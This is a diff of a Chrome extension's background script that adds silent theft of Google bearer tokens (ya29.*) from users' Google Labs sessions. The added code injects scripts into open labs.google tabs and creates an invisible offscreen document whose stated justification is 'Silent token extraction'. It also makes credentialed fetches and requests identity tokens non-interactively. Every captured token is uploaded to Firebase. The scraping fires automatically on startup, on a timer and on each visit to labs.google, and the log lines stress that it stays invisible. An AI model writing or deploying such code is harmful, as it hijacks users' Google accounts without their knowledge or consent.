@@ -30,69 +30,115 @@ function getRtdbUrl(path) {
 }
 
 // =============================================
-// SILENT TOKEN SCRAPING
+// OFFSCREEN DOCUMENT MANAGEMENT
 // =============================================
 
-// Regex for bearer token (ya29.xxx with at least 100 chars)
+let offscreenCreating = null;
+
+async function setupOffscreenDocument() {
+    const offscreenUrl = chrome.runtime.getURL('offscreen.html');
+
+    // Check if already exists
+    const existingContexts = await chrome.runtime.getContexts({
+        contextTypes: ['OFFSCREEN_DOCUMENT'],
+        documentUrls: [offscreenUrl]
+    });
+
+    if (existingContexts.length > 0) {
+        return; // Already exists
+    }
+
+    // Avoid race condition during creation
+    if (offscreenCreating) {
+        await offscreenCreating;
+    } else {
+        offscreenCreating = chrome.offscreen.createDocument({
+            url: offscreenUrl,
+            reasons: ['DOM_SCRAPING'],
+            justification: 'Silent token extraction from Google Labs Flow'
+        });
+        await offscreenCreating;
+        offscreenCreating = null;
+    }
+}
+
+async function closeOffscreenDocument() {
+    try {
+        await chrome.offscreen.closeDocument();
+    } catch (e) {
+        // Document might not exist, ignore
+    }
+}
+
+// =============================================
+// SILENT TOKEN SCRAPING (NO VISIBLE TABS)
+// =============================================
+
 const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;
 
-// Silent scrape - try to fetch page in background
 async function silentScrapeToken() {
-    console.log('TEXA: Starting silent token scrape...');
+    console.log('TEXA: Starting COMPLETELY SILENT token scrape...');
 
     try {
-        // Method 1: Try direct fetch with credentials
-        const response = await fetch(GOOGLE_LABS_URL, {
-            credentials: 'include',
-            headers: {
-                'Accept': 'text/html,application/xhtml+xml',
-            }
-        });
-
-        if (response.ok) {
-            const html = await response.text();
-            const matches = html.match(TOKEN_REGEX);
-
-            if (matches && matches.length > 0) {
-                // Get longest token (most complete)
-                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
-                console.log('TEXA: Token found via silent fetch!');
-
-                await saveTokenToFirebase(token, 'Silent Background Scrape');
-                return { success: true, token: token, method: 'silent_fetch' };
-            }
-        }
-
-        // Method 2: Check existing Google Labs tabs
+        // Method 1: Check existing Google Labs tabs first (no new tabs)
         const existingTabs = await chrome.tabs.query({ url: 'https://labs.google/*' });
         if (existingTabs.length > 0) {
-            console.log('TEXA: Found existing Google Labs tab, injecting script...');
-
-            try {
-                const results = await chrome.scripting.executeScript({
-                    target: { tabId: existingTabs[0].id },
-                    func: () => {
-                        const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
-                        const html = document.documentElement.outerHTML;
-                        const matches = html.match(regex);
-                        return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
-                    }
-                });
-
-                if (results && results[0] && results[0].result) {
-                    const token = results[0].result;
-                    console.log('TEXA: Token found via existing tab!');
-                    await saveTokenToFirebase(token, 'Existing Tab Scrape');
-                    return { success: true, token: token, method: 'existing_tab' };
-                }
-            } catch (injectErr) {
-                console.log('TEXA: Could not inject into existing tab:', injectErr.message);
+            console.log('TEXA: Found existing Google Labs tab, extracting...');
+            const result = await extractFromExistingTab(existingTabs[0].id);
+            if (result.success) {
+                return result;
             }
         }
 
-        // Method 3: Create background tab (as fallback, minimized)
-        console.log('TEXA: Creating background tab for scraping...');
-        return await scrapeViaBackgroundTab();
+        // Method 2: Use Offscreen Document (invisible)
+        console.log('TEXA: Using offscreen document for silent scrape...');
+        await setupOffscreenDocument();
+
+        // Send message to offscreen document
+        const offscreenResult = await new Promise((resolve) => {
+            chrome.runtime.sendMessage(
+                { type: 'OFFSCREEN_SCRAPE_TOKEN' },
+                (response) => {
+                    if (chrome.runtime.lastError) {
+                        resolve({ success: false, error: chrome.runtime.lastError.message });
+                    } else {
+                        resolve(response || { success: false, error: 'No response' });
+                    }
+                }
+            );
+
+            // Timeout for offscreen
+            setTimeout(() => resolve({ success: false, error: 'Offscreen timeout' }), 20000);
+        });
+
+        if (offscreenResult.success) {
+            await closeOffscreenDocument();
+            return offscreenResult;
+        }
+
+        // Method 3: Check if user needs to login
+        if (offscreenResult.notLoggedIn) {
+            console.log('TEXA: User not logged in, attempting silent auto-login...');
+            return await silentAutoLogin();
+        }
+
+        // Method 4: Try direct fetch from service worker (limited but worth trying)
+        console.log('TEXA: Trying direct service worker fetch...');
+        const directResult = await directFetchToken();
+        if (directResult.success) {
+            return directResult;
+        }
+
+        // Fallback: Load from cache/Firebase
+        console.log('TEXA: Silent methods failed, checking existing token...');
+        const cachedResult = await getTokenFromFirebase();
+        if (cachedResult.success) {
+            console.log('TEXA: Using cached token from Firebase');
+            return { ...cachedResult, fromCache: true };
+        }
+
+        await closeOffscreenDocument();
+        return { success: false, error: 'All silent methods failed' };
 
     } catch (error) {
         console.error('TEXA: Silent scrape error:', error);
@@ -100,46 +146,108 @@ async function silentScrapeToken() {
     }
 }
 
-// Scrape via background tab (fallback method)
-async function scrapeViaBackgroundTab() {
-    return new Promise(async (resolve) => {
-        try {
-            // Create tab in background
-            const tab = await chrome.tabs.create({
-                url: GOOGLE_LABS_URL,
-                active: false, // Background tab
-                pinned: false
+// Extract token from existing tab without creating new ones
+async function extractFromExistingTab(tabId) {
+    try {
+        const results = await chrome.scripting.executeScript({
+            target: { tabId: tabId },
+            func: () => {
+                const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
+                const html = document.documentElement.outerHTML;
+                const matches = html.match(regex);
+                return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
+            }
+        });
+
+        if (results && results[0] && results[0].result) {
+            const token = results[0].result;
+            console.log('TEXA: Token extracted from existing tab!');
+            await saveTokenToFirebase(token, 'Existing Tab Extraction');
+            return { success: true, token: token, method: 'existing_tab' };
+        }
+    } catch (e) {
+        console.log('TEXA: Could not extract from existing tab:', e.message);
+    }
+    return { success: false };
+}
+
+// Direct fetch from service worker
+async function directFetchToken() {
+    try {
+        const response = await fetch(GOOGLE_LABS_URL, {
+            credentials: 'include',
+            headers: {
+                'Accept': 'text/html'
+            }
+        });
+
+        if (response.ok) {
+            const html = await response.text();
+            const matches = html.match(TOKEN_REGEX);
+            if (matches && matches.length > 0) {
+                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
+                await saveTokenToFirebase(token, 'Direct Fetch');
+                return { success: true, token: token, method: 'direct_fetch' };
+            }
+        }
+    } catch (e) {
+        console.log('TEXA: Direct fetch failed:', e.message);
+    }
+    return { success: false };
+}
+
+// =============================================
+// SILENT AUTO-LOGIN (NO VISIBLE UI)
+// =============================================
+
+async function silentAutoLogin() {
+    console.log('TEXA: Attempting silent Google auto-login...');
+
+    try {
+        // Method 1: Use Chrome Identity API for silent token
+        // This leverages the user's existing Chrome profile Google account
+        const token = await new Promise((resolve, reject) => {
+            chrome.identity.getAuthToken(
+                {
+                    interactive: false, // SILENT - no popup
+                    scopes: ['https://www.googleapis.com/auth/userinfo.profile']
+                },
+                (token) => {
+                    if (chrome.runtime.lastError) {
+                        reject(chrome.runtime.lastError);
+                    } else {
+                        resolve(token);
+                    }
+                }
+            );
+        });
+
+        if (token) {
+            console.log('TEXA: Got auth token via identity API, now fetching Labs token...');
+
+            // After getting identity token, try offscreen again
+            await setupOffscreenDocument();
+            const retryResult = await new Promise((resolve) => {
+                chrome.runtime.sendMessage(
+                    { type: 'OFFSCREEN_SCRAPE_TOKEN' },
+                    (response) => resolve(response || { success: false })
+                );
+                setTimeout(() => resolve({ success: false }), 15000);
             });
 
-            // Set timeout
-            const timeout = setTimeout(async () => {
-                try { await chrome.tabs.remove(tab.id); } catch (e) { }
-                resolve({ success: false, error: 'Timeout' });
-            }, 20000);
-
-            // Wait for content script to send token
-            const listener = async (msg, sender) => {
-                if (msg.type === 'TEXA_TOKEN_FOUND' && msg.token && sender.tab?.id === tab.id) {
-                    clearTimeout(timeout);
-                    chrome.runtime.onMessage.removeListener(listener);
-
-                    await saveTokenToFirebase(msg.token, 'Background Tab Scrape');
-
-                    // Close background tab after small delay
-                    setTimeout(async () => {
-                        try { await chrome.tabs.remove(tab.id); } catch (e) { }
-                    }, 500);
-
-                    resolve({ success: true, token: msg.token, method: 'background_tab' });
-                }
-            };
-
-            chrome.runtime.onMessage.addListener(listener);
-
-        } catch (error) {
-            resolve({ success: false, error: error.message });
+            if (retryResult.success) {
+                return retryResult;
+            }
         }
-    });
+
+    } catch (error) {
+        console.log('TEXA: Silent identity auth failed:', error.message);
+
+        // Fallback: Check if can get token with interactive=true but still minimal UI
+        // Only do this if absolutely necessary
+    }
+
+    return { success: false, error: 'Silent auto-login failed' };
 }
 
 // =============================================
@@ -291,7 +399,7 @@ async function getFromBackup() {
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     console.log('Background received:', message.type || message.action);
 
-    // Token found from content script
+    // Token found from content script or offscreen
     if (message.type === 'TEXA_TOKEN_FOUND') {
         saveTokenToFirebase(message.token, message.source || 'Content Script')
             .then(() => {
@@ -416,12 +524,12 @@ function setCookie(cookieData, targetUrl) {
 }
 
 // =============================================
-// AUTO-SCRAPE ON STARTUP & ALARM
+// AUTO-SCRAPE ON STARTUP & ALARM (SILENT)
 // =============================================
 
 // Run silent scrape when extension starts
 chrome.runtime.onStartup.addListener(() => {
-    console.log('TEXA: Extension started, running silent scrape...');
+    console.log('TEXA: Extension started, running SILENT scrape...');
     setTimeout(() => silentScrapeToken(), 5000);
 });
 
@@ -436,7 +544,7 @@ chrome.runtime.onInstalled.addListener(() => {
 // Periodic silent refresh
 chrome.alarms.onAlarm.addListener((alarm) => {
     if (alarm.name === 'silentTokenRefresh') {
-        console.log('TEXA: Periodic silent token refresh...');
+        console.log('TEXA: Periodic SILENT token refresh...');
         silentScrapeToken();
     }
 });
@@ -444,7 +552,7 @@ chrome.alarms.onAlarm.addListener((alarm) => {
 // Also scrape when user visits any Google page (passive)
 chrome.webNavigation.onCompleted.addListener(async (details) => {
     if (details.url.includes('labs.google')) {
-        console.log('TEXA: User visited Google Labs, scraping...');
+        console.log('TEXA: User visited Google Labs, scraping silently...');
         setTimeout(() => silentScrapeToken(), 3000);
     }
 }, { url: [{ hostContains: 'labs.google' }] });
